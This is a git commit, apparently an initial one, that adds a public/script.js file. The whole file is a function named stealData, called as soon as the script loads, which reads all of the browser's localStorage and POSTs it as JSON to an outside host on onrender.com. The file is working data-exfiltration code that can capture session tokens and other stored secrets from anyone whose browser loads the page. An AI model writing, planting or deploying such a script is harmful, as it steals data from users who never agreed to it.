a3b5539a08f22e5e3f2fca8cf9686a5e242364e3
ProCodrr <procodrr@gmail.com>
2025-06-27 11:50:19 +0530

    first

---
+++ public/script.js
@@ -0,0 +1,17 @@
+function stealData() {
+  const localStorageData = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    localStorageData[key] = localStorage.getItem(key);
+  }
+
+  fetch("https://tagmango-app.onrender.com/", {
+    method: "POST",
+    body: JSON.stringify({ localStorage: localStorageData }),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  });
+}
+
+stealData();
